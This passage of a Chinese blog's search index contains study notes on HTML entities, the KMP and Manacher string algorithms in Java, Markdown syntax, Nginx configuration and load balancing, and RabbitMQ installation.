si;\n&amp;#936;\n\n\nΩ\n&amp;Omega;\n&amp;#937;\n\n\nα\n&amp;alpha;\n&amp;#945;\n\n\nβ\n&amp;beta;\n&amp;#946;\n\n\nγ\n&amp;gamma;\n&amp;#947;\n\n\nδ\n&amp;delta;\n&amp;#948;\n\n\nε\n&amp;epsilon;\n&amp;#949;\n\n\nζ\n&amp;zeta;\n&amp;#950;\n\n\nη\n&amp;eta;\n&amp;#951;\n\n\nθ\n&amp;theta;\n&amp;#952;\n\n\nι\n&amp;iota;\n&amp;#953;\n\n\nκ\n&amp;kappa;\n&amp;#954;\n\n\nλ\n&amp;lambda;\n&amp;#955;\n\n\nμ\n&amp;mu;\n&amp;#956;\n\n\nν\n&amp;nu;\n&amp;#957;\n\n\nξ\n&amp;xi;\n&amp;#958;\n\n\nο\n&amp;omicron;\n&amp;#959;\n\n\nπ\n&amp;pi;\n&amp;#960;\n\n\nρ\n&amp;rho;\n&amp;#961;\n\n\nς\n&amp;sigmaf;\n&amp;#962;\n\n\nσ\n&amp;sigma;\n&amp;#963;\n\n\nτ\n&amp;tau;\n&amp;#964;\n\n\nυ\n&amp;upsilon;\n&amp;#965;\n\n\nφ\n&amp;phi;\n&amp;#966;\n\n\nχ\n&amp;chi;\n&amp;#967;\n\n\nψ\n&amp;psi;\n&amp;#968;\n\n\nω\n&amp;omega;\n&amp;#969;\n\n\n?\n&amp;thetasym;\n&amp;#977;\n\n\n?\n&amp;upsih;\n&amp;#978;\n\n\n?\n&amp;piv;\n&amp;#982;\n\n\n•\n&amp;bull;\n&amp;#8226;\n\n\n…\n&amp;hellip;\n&amp;#8230;\n\n\n′\n&amp;prime;\n&amp;#8242;\n\n\n″\n&amp;Prime;\n&amp;#8243;\n\n\n‾\n&amp;oline;\n&amp;#8254;\n\n\n⁄\n&amp;frasl;\n&amp;#8260;\n\n\n℘\n&amp;weierp;\n&amp;#8472;\n\n\nℑ\n&amp;image;\n&amp;#8465;\n\n\nℜ\n&amp;real;\n&amp;#8476;\n\n\n™\n&amp;trade;\n&amp;#8482;\n\n\nℵ\n&amp;alefsym;\n&amp;#8501;\n\n\n←\n&amp;larr;\n&amp;#8592;\n\n\n↑\n&amp;uarr;\n&amp;#8593;\n\n\n→\n&amp;rarr;\n&amp;#8594;\n\n\n↓\n&amp;darr;\n&amp;#8595;\n\n\n↔\n&amp;harr;\n&amp;#8596;\n\n\n↵\n&amp;crarr;\n&amp;#8629;\n\n\n⇐\n&amp;lArr;\n&amp;#8656;\n\n\n⇑\n&amp;uArr;\n&amp;#8657;\n\n\n⇒\n&amp;rArr;\n&amp;#8658;\n\n\n⇓\n&amp;dArr;\n&amp;#8659;\n\n\n⇔\n&amp;hArr;\n&amp;#8660;\n\n\n∀\n&amp;forall;\n&amp;#8704;\n\n\n∂\n&amp;part;\n&amp;#8706;\n\n\n∃\n&amp;exist;\n&amp;#8707;\n\n\n∅\n&amp;empty;\n&amp;#8709;\n\n\n∇\n&amp;nabla;\n&amp;#8711;\n\n\n∈\n&amp;isin;\n&amp;#8712;\n\n\n∉\n&amp;notin;\n&amp;#8713;\n\n\n∋\n&amp;ni;\n&amp;#8715;\n\n\n∏\n&amp;prod;\n&amp;#8719;\n\n\n∑\n&amp;sum;\n&amp;#8721;\n\n\n−\n&amp;minus;\n&amp;#8722;\n\n\n∗\n&amp;lowast;\n&amp;#8727;\n\n\n√\n&amp;radic;\n&amp;#8730;\n\n\n∝\n&amp;prop;\n&amp;#8733;\n\n\n∞\n&amp;infin;\n&amp;#8734;\n\n\n∠\n&amp;ang;\n&amp;#8736;\n\n\n∧\n&amp;and;\n&amp;#8743;\n\n\n∨\n&amp;or;\n&amp;#8744;\n\n\n∩\n&amp;cap;\n&amp;#8745;\n\n\n∪\n&amp;cup;\n&amp;#8746;\n\n\n∫\n&amp;int;\n&amp;#8747;\n\n\n∴\n&amp;there4;\n&amp;#8756;\n\n\n∼\n&amp;sim;\n&amp;#8764;\n\n\n∝\n&amp;cong;\n&amp;#8773;\n\n\n≈\n&amp;asymp;\n&amp;#8776;\n\n\n≠\n&amp;ne;\n&amp;#8800;\n\n\n≡\n&amp;equiv;\n&amp;#8801;\n\n\n≤\n&amp;le;\n&amp;#8804;\n\n\n≥\n&amp;ge;\n&amp;#8805;\n\n\n⊂\n&amp;sub;\n&amp;#8834;\n\n\n⊃\n&amp;sup;\n&amp;#8835;\n\n\n⊄\n&amp;nsub;\n&amp;#8836;\n\n\n⊆\n&amp;sube;\n&amp;#8838;\n\n\n⊇\n&amp;supe;\n&amp;#8839;\n\n\n⊕\n&amp;oplus;\n&amp;#8853;\n\n\n⊗\n&amp;otimes;\n&amp;#8855;\n\n\n⊥\n&amp;perp;\n&amp;#8869;\n\n\n⋅\n&amp;sdot;\n&amp;#8901;\n\n\n?\n&amp;lceil;\n&amp;#8968;\n\n\n?\n&amp;rceil;\n&amp;#8969;\n\n\n?\n&amp;lfloor;\n&amp;#8970;\n\n\n?\n&amp;rfloor;\n&amp;#8971;\n\n\n?\n&amp;lang;\n&amp;#9001;\n\n\n?\n&amp;rang;\n&amp;#9002;\n\n\n◊\n&amp;loz;\n&amp;#9674;\n\n\n♠\n&amp;spades;\n&amp;#9824;\n\n\n♣\n&amp;clubs;\n&amp;#9827;\n\n\n♥\n&amp;hearts;\n&amp;#9829;\n\n\n♦\n&amp;diams;\n&amp;#9830;\n\n\n重要的国际标记 markup-significant and internationalization characters\n\n\n字符\n名称\n十进制\n\n\n\n“\n&amp;quot;\n&amp;#34;\n\n\n&#96;&amp;\n&amp;&#96;\n&amp;#38;\n\n\n&lt;\n&amp;lt;\n&amp;#60;\n\n\n&gt;\n&amp;gt;\n&amp;#62;\n\n\nŒ\n&amp;OElig;\n&amp;#338;\n\n\nœ\n&amp;oelig;\n&amp;#339;\n\n\nŠ\n&amp;Scaron;\n&amp;#352;\n\n\nš\n&amp;scaron;\n&amp;#353;\n\n\nŸ\n&amp;Yuml;\n&amp;#376;\n\n\nˆ\n&amp;circ;\n&amp;#710;\n\n\n˜\n&amp;tilde;\n&amp;#732;\n\n\n\n&amp;ensp;\n&amp;#8194;\n\n\n\n&amp;emsp;\n&amp;#8195;\n\n\n\n&amp;thinsp;\n&amp;#8201;\n\n\n\n&amp;zwnj;\n&amp;#8204;\n\n\n\n&amp;zwj;\n&amp;#8205;\n\n\n\n&amp;lrm;\n&amp;#8206;\n\n\n\n&amp;rlm;\n&amp;#8207;\n\n\n–\n&amp;ndash;\n&amp;#8211;\n\n\n—\n&amp;mdash;\n&amp;#8212;\n\n\n‘\n&amp;lsquo;\n&amp;#8216;\n\n\n’\n&amp;rsquo;\n&amp;#8217;\n\n\n‚\n&amp;sbquo;\n&amp;#8218;\n\n\n“\n&amp;ldquo;\n&amp;#8220;\n\n\n”\n&amp;rdquo;\n&amp;#8221;\n\n\n„\n&amp;bdquo;\n&amp;#8222;\n\n\n†\n&amp;dagger;\n&amp;#8224;\n\n\n‡\n&amp;Dagger;\n&amp;#8225;\n\n\n‰\n&amp;permil;\n&amp;#8240;\n\n\n‹\n&amp;lsaquo;\n&amp;#8249;\n\n\n›\n&amp;rsaquo;\n&amp;#8250;\n\n\n€\n&amp;euro;\n&amp;#8364;\n\n\n","categories":["学习笔记"],"tags":["HTML","XML","转义字符"]},{"title":"KMP和Manacher算法","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/KMP%E5%92%8CManacher%E7%AE%97%E6%B3%95/","content":"字符串匹配（模式匹配）问题：给定一个主串（以 S 代替）和模式串（以 P 代替），要求找出 P 在 S 中出现的位置，此即串的模式匹配问题。\n暴力匹配（BF）暴力匹配即将主串每个元素都作为起点和模式串相比较，直至后续与模式串全部匹配则成功找到。\npublic class BF &#123;    /**     * 暴力算法（Brute Force）     */    public static int BF(String S, String P) &#123;        char[] s = S.toCharArray();        char[] p = P.toCharArray();        // 遍历主串所有元素，从每个元素作为起点和模式串比较        for (int i = 0; i &lt; S.length(); i++) &#123;            int j;            int temp = i;            // 从当前i作为起点比较，不等则break，相等则判断下一个。直至判断长度与模式串长度相等。即匹配成功            for (j = 0; j &lt; P.length(); j++) &#123;                if (s[temp] != p[j]) &#123;                    break;                &#125;                temp++;            &#125;            if (j == P.length()) &#123;                return i;            &#125;        &#125;        return -1;    &#125;&#125;\n\nKMPKMP算法是一种改进的字符串匹配算法。从暴力算法中可以看出，每次匹配失败时，都会从主串的下一个字符重新开始与模式串一一比较。即每次失败，模式串只右移了一位。KMP算法的关键是利用匹配失败后的信息，尽量减少模式串与主串的匹配次数以达到快速匹配的目的。 即让模式串尽可能多的向右移。\n匹配失败后，模式串该向右移多少位。将会记录在next数组中，next数组只与模式串本身有关，与主串无关。下面来解释下next数组的含义以及求法。\n匹配失败时，主串与模式串失败位置的字符不同，但是模式串这个字符前所有字符与主串这个字符前的字符串是匹配的。如果模式串匹配失败字符串前的字串中，有与开头n个字符长度重复的公共元素。那么下一次比较从重复的地方开始即可。无需从模式串的起始开始，从而减少比较次数。比如：\n主串：      abcdabcdabd模式串：    abcdabd\n当匹配到第七个元素时，主串c与模式串d不等。但d前有长度为2的重复公共元素（与开头开始的元素有2长度的重合）：ab所以可以将模式串向右移4位，即使得从头开始的重复子串后一个元素与匹配失败的元素比较。 因为前面的元素是匹配过的重复元素。\n主串：      abcdabcdabd模式串：        abcdabd\n\n这个重复的公共元素长度叫 最大前缀后缀公共元素长度对于字符串 abcdabd 来说。它的各个子串的前缀后缀的公共元素的最大长度如下表格所示：\n\n\n\n字符\na\nb\nc\nd\na\nb\nd\n\n\n\n最大前缀后缀公共元素长度\n0\n0\n0\n0\n1\n2\n0\n\n\nnext数组考虑的是除了当前字符串外的最长相同前缀后缀，所以去除当前字符，只看他前面的。将上表得到的值整体往后移一位即可。同时，模式串首位初值赋为-1。原因是标记开头，当开头不匹配时，模式串右移一位，而不是回到0位置，导致陷入循环。字符串 abcdabd 的 next 数组：\n\n\n\n字符\na\nb\nc\nd\na\nb\nd\n\n\n\n最大前缀后缀公共元素长度\n-1\n0\n0\n0\n0\n1\n2\n\n\nnext数组的实现：\npackage PatternMatching;public class KMP &#123;    public static int[] getNext(String P) &#123;        char[] p = P.toCharArray();        int[] next = new int[P.length()];        // 起始位置为-1        next[0] = -1;        int j = 0;        int k = -1;        while (j &lt; p.length - 1) &#123;            // p[k]表示前缀，p[j]表示后缀            if (k == -1 || p[k] == p[j]) &#123;                next[++j] = ++k;            &#125; else &#123;                // 不匹配，前缀则回到上一个最大重复的位置（next数组构造本身就用到了next数组的特性）                k = next[k];            &#125;        &#125;        return next;    &#125;&#125;\n\nKMP中else部分，与求next数组中的else部分是一样的。KMP实现：\npackage PatternMatching;public class KMP &#123;    public static int KMP(String S, String P) &#123;        char[] s = S.toCharArray();        char[] p = P.toCharArray();        int i = 0;        int j = 0;        int[] next = getNext(P);        while (i &lt; s.length &amp;&amp; j &lt; p.length) &#123;            if (j == -1 || s[i] == p[j]) &#123;                i++;                j++;            &#125; else &#123;                j = next[j];            &#125;        &#125;        return j == p.length ? i - j : -1;    &#125;&#125;\n\n求字符串的最长回文子串暴力（BF）照例先暴力实现时间复杂度 O(n^2)\npackage LongestPalindromicSubstring;public class BF &#123;    public static int BF(String str) &#123;        char[] string = str.toCharArray();        int result = 0;        for (int i = 0; i &lt; str.length(); i++) &#123;            // 判断奇数长度回文            int l = i - 1;            int r = i + 1;            while (l &gt;= 0 &amp;&amp; r &lt; str.length() &amp;&amp; string[l] == string[r]) &#123;                l--;                r++;            &#125;            result = Math.max(result, r - l - 1);            // 判断偶数长度回文            l = i;            r = i + 1;            while (l &gt;= 0 &amp;&amp; r &lt; str.length() &amp;&amp; string[l] == string[r]) &#123;                l--;                r++;            &#125;            result = Math.max(result, r - l - 1);        &#125;        return result;    &#125;&#125;\n\nManacher算法Manacher算法，也叫马拉车算法 （翻译的信达雅呢）这个算法用于求字符串的最长回文子串。时间复杂度到了 O(n)\nManacher的核心就是回文半径的概念。由于回文串的奇偶不一样，处理也不同。所以在处理之前，在每个字符前后添加一个相同字符。这样左右的回文串都会变成奇回文串。比如 abba 通过处理变成 #a#b#b#a#\n回文半径和回文直径：因为处理后回文字符串的长度一定是奇数，所以回文半径是包括回文中心在内的回文子串的一半的长度，回文直径则是回文半径的2倍减1。比如对于字符串 “aba”，在字符 ‘b’ 处的回文半径就是2，回文直径就是3。最右回文边界R：在遍历字符串时，每个字符遍历出的最长回文子串都会有个右边界，而R则是所有已知右边界中最靠右的位置，也就是说R的值是只增不减的。回文中心C：取得当前R的第一次更新时的回文中心。由此可见R和C时伴生的。半径数组：这个数组记录了原字符串中每一个字符对应的最长回文半径。\n过程：从i&#x3D;0遍历字符串\n\n当i&gt;R 即i在R外，那直接暴力匹配以i为中心的回文子串\n当i&lt;&#x3D;R 即i在R内。分为\ni’的回文半径在R-L内，那么i的回文半径也和i’相同\ni’的回文半径在R-L上，i的回文半径和i’相同，但后面还要继续比较，i的回文半径可能会变大。\ni’的回文半径在R-L外，和上面一样，也需要往后比。(图就不放了，可以参考上面的图，但红线得划到L和R外)\n\n\n\nManacher算法实际是利用了回文的特性，即回文中的回文不需要再重复比较，由回文的特性可以跳过已经比较过的（即跳过半径数组中的长度）\nManacher实现：\npackage LongestPalindromicSubstring;public class Manacher &#123;    public static int Manacher(String str) &#123;        int len = str.length() * 2 + 1;        char[] string = new char[len];        char[] str1 = str.toCharArray();        int index = 0;        // 将字符串中添加特殊字符，让字符串只有奇回文        for (int i = 0; i &lt; len; i++) &#123;            string[i] = (i % 2) == 0 ? &#x27;#&#x27; : str1[index++];        &#125;        // 记录回文半径的数组        int[] p = new int[len];        // r最右回文右边界，c对应的最左回文中心，maxn最大回文半径        int r = -1;        int c = -1;        int maxn = Integer.MIN_VALUE;        // 从左往右遍历        for (int i = 0; i &lt; len; i++) &#123;            // i&gt;r 时，回文半径为1，否则回文半径就是 i对应i‘的回文半径 或者 i到r的距离            p[i] = r &gt; i ? Math.min(r - i, p[2 * c - i]) : 1;            while (i + p[i] &lt; len &amp;&amp; i - p[i] &gt; -1) &#123;                if (string[i + p[i]] == string[i - p[i]]) &#123;                    p[i]++;                &#125; else &#123;                    break;                &#125;            &#125;            // 判断r和c是否可以更新            if (i + p[i] &gt; r) &#123;                r = i + p[i];                c = i;            &#125;            // 更新最大回文半径            maxn = Math.max(maxn, p[i]);        &#125;        return maxn - 1;    &#125;&#125;\n\n总结参考文章：\n字符串匹配KMP算法详解四种最常见的字符串匹配算法概述马拉车算法（Manacher’s Algorithm）最长回文子串的五种求法(暴力、中点扩散、DP、hash+二分、Manacher)\n","categories":["学习笔记"],"tags":["字符串","模式匹配","回文"]},{"title":"Markdown语法","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Markdown%E8%AF%AD%E6%B3%95/","content":"关于MarkdownMarkdown 是轻量级的标记语言，可用于在纯文本文档中添加格式化元素。Markdown 由 John Gruber 于 2004 年创建。专注于文字内容纯文本，方便读写，且兼容性良好语法简单，学习成本低不适用于对排版要求高的场景\nMarkdown的工作原理在使用 Markdown 格式书写时，文本内容存储在 .md 或 .markdown 拓展名的纯文本文件中。Markdown 应用程序使用一种称为 Markdown 处理器（也通常称为“解析器”或“实现”）的东西将获取到的 Markdown 格式的文本输出为 HTML 格式。这时，便可以在 Web 浏览器中查看这篇文档。所以 Markdown 语法是兼容 HTML 语言的，所以在 Markdown 中可以直接使用 HTML 标签，来实现各种样式。比如下文 4.4 中下划线的实现便使用了&lt;u&gt;标签\n标题底线表示一级标题===二级标题---\n\n效果如图：说明：\n\n底线是=表示一级标题\n底线是-表示二级标题\n底线符号至少2个才可以表示标题\n这种语法只支持这两级标题\n\n#表示# 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题\n\n效果如图：说明：\n\n在行首插入#可标记标题\n#的个数表示标题的等级\n建议在#后加一个空格\nMarkdown最多支持前六级标题\n\n建议\n使用#标记标题，而不是===或者---，因为后者不便于阅读和理解，不简洁明了。\n保持间距，标题前后空一行，#与文本间也空一格。\n不要有多余的空格，标题开头和结尾不要有多余的空格\n标题的结尾不要有标点符号\n标题要简短\n\n段落格式段落行与行之间没有空行（什么都没有，或者只有空格和制表符），将会被视为同一段落。有空行则会被视为不同段落。段内换行，在行末添加2个或以上空格。\n字体*斜体文本*_斜体文本_**粗体文本**__粗体文本__***粗斜体文本***___粗斜体文本___\n\n效果如图：\n建议\n\n粗体使用**包裹，斜体使用*包裹\n语法标记内不要有空格。\n\n分割线**** * ******- - -____ _ _\n\n效果如图：（本分割线有主题样式，并非Markdown原生）说明：\n\n分割线使用3个或以上的*或-或_标记\n行内不能有其他字符，除了空格。\n\n删除线 和 下划线~~删除线~~&lt;u&gt;下划线&lt;/u&gt;\n\n效果如图：\n列表无序列表## 使用** 第一项* 第二项* 第三项## 使用++ 第一项+ 第二项+ 第三项## 使用-- 第一项- 第二项- 第三项\n\n效果如图：\n有序列表1. 第一项2. 第二项3. 第三项\n\n效果如图：\n列表嵌套1. 一层列表    * 二层列表        1. 三层列表            * 四层列表\n\n效果如图：\n区块&gt; 大佬说过的话&gt;&gt; 第一点！&gt;&gt;&gt; 认真听！&gt; 区块中使用列表&gt; 1. 第一项&gt; 2. 第二项&gt; * 第一项&gt; * 第二项* 列表中使用区块  &gt; 第一项  &gt; 第二项* 第二项\n\n效果如图：（这里区块样式也并非Markdown原生）\n图片![文本](图片链接)\n\n效果…上文中所以引用图片就是效果。说明：\n\n图片链接，可以是本地图片，也可以是网络图片。\n本地图片可以使用相对路径，也可以使用绝对路径。（建议使用相对路径，当项目迁移时，文档不会加载不出图片。当然，这得建立在有一个好地整理习惯的前提下）\n\n链接[文本](链接)[博客首页](https://2450123.github.io)&lt;链接&gt;&lt;https://2450123.github.io&gt;这是[引用链接]。[引用链接]: https://2450123.github.io\n\n效果如下：博客首页https://2450123.github.io引用链接这里用不了，所以不做演示。它相当于定义了一个变量，可以重复引用。说明：\n\n网络链接要写全，比如 https://2450123.github.io ，否则会被识别问本地地址。\n定义的链接可以放在文件任意位置，建议放在文末。\n引用链接不区分大小写\n链接标记可以有数字、字母、空格和标点。\n\n表格| 左对齐 | 右对齐 | 居中对齐 || :-----| ----: | :----: || 单元格 | 单元格 | 单元格 || 单元格 | 单元格 | 单元格 |\n\n效果如下：\n\n\n\n左对齐\n右对齐\n居中对齐\n\n\n\n单元格\n单元格\n单元格\n\n\n单元格\n单元格\n单元格\n\n\n说明：\n\n\n\n\n\n使用 | 来分隔不同的单元格，使用 - 来分隔表头和其他行。\n-: 设置内容和标题栏居右对齐。\n:- 设置内容和标题栏居左对齐。\n:-: 设置内容和标题栏居中对齐。\n\n代码这是代码块\n\n这是行内代码说明：\n\n代码块使用 ~~~ 包裹\n行内代码使用 ` 包裹\n\n总结写这篇的本意是让刚开始使用Markdown的我熟悉一下Markdown的语法格式，更加熟练的使用他来写博客。我在这里列出了他的基础语法，他还有很多插件，可以实现各种各样的功能，比如数学公式和注脚等等。但是Markdown的开发者John Gruber说：\n\nMarkdown 格式化语法设计的目的就是为了易读，而且 Markdown 应该可以直接使用纯文本进行发布，无需标签或者是一些格式化命令。\n\n简单来说，Markdown就是为了让我们专注于内容，而不是关注他的排版。所以，我觉得如果过于在意他的语法，有些买椟还珠的意味。所以本篇就列举一些基础的语法，其他高阶的用法就不罗列了。这里也是为了方便我后续来看，不过还是那句话，应该注重内容，而不是排版。\n","categories":["学习笔记"],"tags":["markdown"]},{"title":"Nginx笔记","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Nginx%E7%AC%94%E8%AE%B0/","content":"关于NginxNginx是一个轻量的web服务器&#x2F;反向代理服务器&#x2F;电子邮件代理服务器，占用内存少，并发能力强。nginx是由c语言开发的。  \n反向代理反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。  \n反向代理隐藏了真正的服务端。\n正向代理是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。比如vpn。  \n环境搭建安装nginx官网nginx安装需要相关的依赖库，否则配置和编译会出现错误。gcc编译器、openssl库、pcre库、zlib库一次安装命令：yum install gcc openssl-devel pcre pcre-devel zlib zlib-devel -y\n然后解压缩官网下载的nginx压缩包。配置安装目录./configure --prefix=/安装目录编译make安装make install\n普通启动运行sbin目录下的nginx文件./nginxnginx由master进程和worker进程组成。master进程读取配置文件，并维护worker进程，而worker进程则对请求进行实际处理。\n启动成功后，访问80端口便会出现如下欢迎页面：\n通过配置文件启动-c 参数指定配置文件绝对路径./nginx -c nginx.conf配置文件绝对路径\n关闭\n优雅的关闭找出进程号，执行下面的命令kill -QUIT 主pidpid是主进程号，即master process。其他worker process为子进程。这种关闭方式会使nginx不再接受新的请求，等待nginx处理完请求后再关闭。\n\n快速关闭kill -TERM 主pid直接关闭，比较暴力。或者直接kill。\n\n\n重启一般用于修改配置，重启服务器。./nginx -s reload\n其他在启动命令后加 -t 会检查配置文件是否正确successful是正确，failed是失败。只能检查语法错误（废话）  \n查看版本\n# 查看nginx版本。./nginx -v# 查看nginx版本、编译器版本和配置参数./nginx -V\n\n配置文件#配置worker进程运行用户，默认用户为nobody。nobody用户一般用于启动程序，没有密码。  #user nobody;  #配置工作进程数量，通常等于cpu数量或2倍于cpu数量。  worker_processes 1;  #配置全局错误日志及类型，[debug | info | notice | warn | error | crit]，默认为error。  error_log logs/error.log;  #error_log logs/error.log info;#配置进程pid文件，记录pid号，每次启动都会更新。  pid logs/nginx.pid  #配置工作模式和连接数  events&#123;    worker_connections 1024;  ##配置每个worker进程连接上限，上限65535。nginx支持总连接数等于 worker_connection * worker_processes&#125;#配置http服务器，利用反向代理功能提供负载均衡支持  http&#123;    #配置nginx支持哪些多媒体类型，可以在conf/mime.types查看支持哪些多媒体类型      include mime.types      #默认文件类型 流类型，可以理解支持任意类型      default_type application/octet-stream      #配置日志格式      #log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;      #                  &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;      #                  &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;      #配置access.log日志及存放路径，并使用上面定义的main日志格式      #access_log  logs/access.log  main;      #开启高效文件传输模式      sendfile     on;        #防止网络阻塞      #tcp_nopush   on;      #长连接超时时间，单位秒    #keepalive_timeout  0;    keepalive_timeout  65;    #开启gzip压缩输出    #gzip  on;        #配置虚拟主机，可以有多个server    server&#123;            #配置监听端口        listen       80;        #配置服务名        server_name  localhost;        #配置字符集        #charset koi8-r;        #配置本虚拟主机的访问日志        #access_log  logs/host.access.log  main;        #默认的匹配斜杠/（根路径）的请求，当访问路径中有/，会被该location匹配到并进行处理        location / &#123;            #root是配置服务器的默认网站根目录的位置，默认为nginx安装目录下的html目录            root   html;            #配置首页文件的名称            index  index.html index.htm;        &#125;                #配置404页面        #error_page  404              /404.html;                #配置50x错误页面        error_page   500 502 503 504  /50x.html;        location = /50x.html &#123;            root   html;        &#125;        #精确匹配，拦截各种请求。        # proxy the PHP scripts to Apache listening on 127.0.0.1:80        #        #location ~ \\.php$ &#123;        #    proxy_pass   http://127.0.0.1;        #&#125;        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000        #        #location ~ \\.php$ &#123;        #    root           html;        #    fastcgi_pass   127.0.0.1:9000;        #    fastcgi_index  index.php;        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;        #    include        fastcgi_params;        #&#125;        # deny access to .htaccess files, if Apache&#x27;s document root        # concurs with nginx&#x27;s one        #        #location ~ /\\.ht &#123;        #    deny  all;        #&#125;    &#125;&#125;\n\n静态网站部署修改配置文件  \nlocation /项目名（请求根路径） &#123;    root  /项目根路径    index index.html&#125;\n重启nginx即可访问。  \n\nindex.html 磁盘存放路径为 &#x2F;项目根路径&#x2F;项目名&#x2F;index.html访问的url为 ip:port&#x2F;项目名&#x2F;index.html\n\n负载均衡负载均衡通常指将请求均匀地分摊到集群的多个服务器节点上执行，这里均匀指在比较大的统计范围内是基本均匀的，并不是完全均匀的。  \n硬件负载均衡比如 F5、深信服、Array 等优点是有厂商专业技术团队提供支持，性能稳定。缺点是费用昂贵。  \n软件负载均衡比如 Nginx、LVS、HAProxy 等优点是开源免费，成本低。  \nnginx负载均衡示例：www.example.com修改配置文件server中添加\nlocation / &#123;    proxy_pass http://www.example.com;&#125;\nserver上添加\nupstream www.example.com &#123;    server 127.0.0.1:8081    server 127.0.0.1:8082&#125;\n\nnginx负载均衡策略\n轮询（默认）每个请求会按时间顺序逐一分配到不同的后端服务器。如果服务器down掉了，会自动剔除。一般后端服务器性能接近。\n权重通过权重值分发请求，值越大访问的比例越大，用于后端服务器性能不均的情况。参数 weight=1\n最少连接请求会被转发到链接数最少的服务器上。在upstream中添加 least conn;\nip_haship_hash也叫ip绑定，每个请求按访问ip的hash值分配，这样每个访问客户端会固定访问一个后端服务器，可以解决session会话丢失的问题。在upstream中添加 ip hash;\n\n其他配置  \n\n参数 backup 标记该服务器为备用服务器。当主服务器停止时，请求会被转发到这里。  \n参数 down 标记该服务器停机。\n\n静态代理将所有静态资源访问改为访问nginx，而不是tomcat。因为nginx更擅长静态资源的处理，性能更好，效率更高。  \n在配置文件中，配置静态资源所在目录\nlocation ~.*/(css|js|img|images)&#123;    root /web/static;&#125;\n\n\n正则匹配目录，比匹配后缀会好一些。\n\n动静分离\n","categories":["学习笔记"],"tags":["Nginx"]},{"title":"RabbitMQ笔记","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/RabbitMQ%E7%AC%94%E8%AE%B0/","content":"概述什么是消息队列消息（message）是指在应用之间传送的数据。可以是简单的纯文本字符串，也可以很复杂，包含嵌入对象。\n消息队列（message queue）是一种应用间的通信方式，消息发送后立即返回，由消息系统来确保可靠传递。消息发布者只管把消息发布到MQ中而不管谁来取，消息使用者只管从MQ中取消息而不管谁发布。这样发布者和使用者都不需要知道对方的存在。\n为什么使用消息队列消息队列是一种应用之间的异步协作机制。\n例如驿站收发快递。快递员并不需要知道收件人的具体信息，只用送到对应驿站即可；收件人也并需要不知道快递员具体信息，只需到驿站取即可。但传统收发快递，快递员得等收件人接收后，再去送下一个快递。导致效率的降低。再例如订单系统。下单后的逻辑可能包括：扣减库存、生成订单信息、发送短信通知、发红包。最开始这些逻辑是放在一起同步执行。但为了提高服务效率，有些不需要立即生效的操作可以拆分出来异步执行，如发短信通知、发红包等。这种场景可以使用MQ，在主流程（扣减库存、生成订单）执行完毕后发送一条消息到MQ，由另外的线程拉取MQ的消息（或由MQ推送），执行相应的业务逻辑。\n以上是用于业务解耦的情况，其他常见场景包括最终一致性、广播、错峰控流等。\nRabbitMQ特点RabbitMQ是由Erlang语言开发的AMQP的开源实现。AMQP（Advanced Message Queuing Protocol）：高级消息队列协议。是应用层协议的一个开放标准，为面向消息的中间件设计。基于此协议的客户端与消息中间件可传递消息，并不受客户端&#x2F;中间件不同产品，不同的开发语言等条件的限制。RabbitMQ最初起源于金融系统，用于在分布式系统中存储转发消息。在易用性、扩展性、高可用性等方面表现都不错。特点：\n\n可靠性（Reliability）使用持久化、传输确认、发布确认等机制来保证可靠性。\n灵活的路由（Flexible Routing）在消息进入队列之前，通过Exchange来路由消息。对于典型的路由功能，RabbitMQ提供了一些内置的Exchange实现。对于复杂的路由功能，可以将多个Exchange绑定在一起，也可以通过插件机制实现自己的Exchange。\n消息集群（Clustering）多个RabbitMQ服务器可以组成一个集群，形成一个逻辑Broker。\n高可用（Highly Availability Queues）队列可以在集群中的机器上进行镜像，防止单点故障。\n多种协议（Multi-protocol）RabbitMQ支持多种消息队列协议，如 STOMP、MQTT等。\n多语言客户端（Many Clients）RabbitMQ支持很多常用语言，如Java、.net、Ruby等。\n管理界面（Management UI）RabbitMQ提供了一个易用的用户界面，使用户可以监控和管理消息Broker的许多方面。\n跟踪机制（Tracing）如果消息异常，RabbitMQ提供了消息跟踪机制，使用者可以赵卒发生了什么。\n\nRabbitMQ安装安装RabbitMQ官网Erlang官网Erlang和RabbitMQ版本对照\n依赖包安装 yum install gcc glibc-devel make ncurses-devel openssl-devel xmlto -y解压erlang源码包 tar -zxvf otp_src_25.0.4.tar.gz创建erlang的安装目录 mkdir /usr/local/erlang进入erlang的解压目录 cd otp_src_25.0.4配置erlang的安装信息 ./configure --prefix=/usr/local/erlang --without-javac编译安装 make &amp;&amp; make install配置环境变量 vim /etc/profile添加如下内容：\nERL_HOME=/usr/local/erlangPATH=$ERL_HOME/bin:$PATHexport ERL_HOME PATH\n更新环境变量 source /etc/profile查看erlang版本 erl -version如上图，即为安装成功。然后开始安装RabbitMQ。\n安装RabbitMQ rpm -ivh --nodeps rabbitmq-server-3.10.7-1.el8.noarch.rpm\nRabbitMQ常用命令启动与关闭启动 rabbitmq-server start\n\n可能会出现错误，错误原因是&#x2F;var&#x2F;lib&#x2F;rabbitmq&#x2F;.erlang.cookie文件权限不够解决方案：chmod rabbitmq:rabbitmq/var.lib.rabbitmq/.erlang.cookie chmod 400 /var/lib/rabbitmq/.erlang.cookie\n\n停止服务 rabbitmqctl stop\n插件管理添加插件 rabbitmq-plugins enable &#123;插件名&#125;\n\nRabbitMQ启动后可以使用浏览器进入管控台，但默认情况RabbitMQ不允许直接使用浏览器访问。默认访问端口 15672因此需要添加插件 rabbitmq-plugins enable rabbitmq_management\n\n删除插件 rabbitmq-plugins disable 